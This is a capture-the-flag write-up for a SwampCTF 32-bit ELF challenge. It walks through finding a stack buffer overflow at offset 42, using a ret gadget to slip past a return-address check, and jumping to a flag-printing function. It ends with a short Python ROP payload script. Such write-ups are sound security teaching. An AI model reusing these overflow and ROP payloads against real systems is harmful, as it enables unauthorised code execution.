# Pwning Apprentice's return

## Challenge description:

For one such as yourself, apprentice to the arts of time manipulation, you must pass this first trial with a dreadful creature.

**Connect:**
nc chal1.swampctf.com 1802

-=Created By: TobalJackson=-

[return](files/return)

---

## Solution:

We were given an unstripped 32-bit ELF binary:
```
$ file return 
return: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=5e510acf107cc9f91edd02f76f14598fcb30de6b, not stripped
```

First thing to know when pwning a binary is to check the security measures enabled:

```
$ checksec return 
[*] '/home/vagrant/sharedFolder/ctf/swamp/apprentice_return/return'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

So the most important thing to keep in mind is that the NX bit is set which stands for [No-eXecutable](https://en.wikipedia.org/wiki/NX_bit). Let's open the binary in [Binary Ninja](https://binary.ninja/). The main function is quite straightforward, it calls the `doBattle()` function, after that it prints some text:

![main disas](files/main_dis.png?raw=true)

I guess the `doBattle()` is the function we're supposed to pwn. However, it is worth noticing another interesting function in the functions list called `slayTheBeast()`:

![slayTheBeast disas](files/slaythebeast_dis.png?raw=true)

This function basically `cat`s the flag for us. Which means we probably need to somehow jump to this function. Let's examine the `doBattle()` function:

![doBattle disas](files/dobattle_dis.png?raw=true)

The function prints some text, then reads a max of 50 characters. A weird thing to notice is that it performs a check for the value at offset 42 from the read characters and compares it with `0x08048595`. This corresponds to the end of the `doBattle()` function:

```
0x08048595      leave
0x08048596      ret
```

After playing with the binary with gdb, it becomes clear that the `doBattle()` function suffers from a buffer overflow vulnerability. The offset to overwrite `EIP` is 42. There was a problem however when using the vanilla "payload testing" method: `A * 42 + BBBB`.

The check mentioned previously will basically let us fail since `BBBB` translates to `0x42424242` which is bigger than `0x08048595`, so I changed the payload to `A * 42 + \x01 * 4`:

![testing payload](files/testing_payload.png?raw=true)

After stepping a bit, it seems we're on the right path:

![right offset](files/right_offset.png?raw=true)

Now we need to jump to `slayTheBeast()` function, however this function resides at address `0x080485db`. The previously mentioned check will prevent us from jumping to it directly since the address to jump to needs to be smaller than `0x08048595`. Let's search for some [ROP gadgets](https://en.wikipedia.org/wiki/Return-oriented_programming) using [peda](https://github.com/longld/peda):

```
gdb-peda$ ropgadget
ret = 0x804835a
popret = 0x8048371
pop2ret = 0x804868a
pop4ret = 0x8048688
pop3ret = 0x8048689
addesp_12 = 0x804836e
addesp_16 = 0x8048465
```

The `ret` at `0x0804835a` will do the job since it's smaller than `0x08048595` and it will allow us to return/jump to the `slayTheBeast()` function which will follow right after it. Our final payload will look like this: `A * 42 + ret + slayTheBeast`. In practice, this simple Python script will do the job:

```
from struct import pack

payload = 'A' * 42                 # offset
payload += pack('<I', 0x804835a)   # ret gadget to bypass check (addr must be lower than 0x8048595)
payload += pack('<I', 0x080485db)  # slayTheBeast() addr

print payload 
```

It's important when using `cat` to keep `stdin` open with `-`:

![get flag](files/get_flag.png?raw=true)